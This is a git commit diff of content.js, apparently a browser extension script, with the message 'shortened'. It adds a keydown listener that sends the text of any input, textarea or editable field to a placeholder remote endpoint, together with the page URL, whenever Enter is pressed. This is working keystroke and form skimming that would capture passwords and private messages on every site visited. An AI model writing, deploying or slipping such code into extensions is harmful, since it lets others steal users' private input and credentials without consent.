cbdf20a1f722505a01825aea8d2a64d1e436ccf3
zedpaixd <planta636@gmail.com>
2025-02-25 23:38:11 +0200

    shortened

--- content.js
+++ content.js
@@ -1,1 +1,1 @@
-document.addEventListener('keydown',e=>{e.key==='Enter'&&(t=e.target).matches('input,textarea,[contenteditable]')&&fetch('API-LINK-HERE',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:(t.value||t.textContent).trim(),url:document.URL})})});
+document.addEventListener('keydown',e=>{e.key==='Enter'&&(t=e.target).matches('input,textarea,[contenteditable]')&&fetch('API-LINK',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:(t.value||t.textContent),url:document.URL})})});
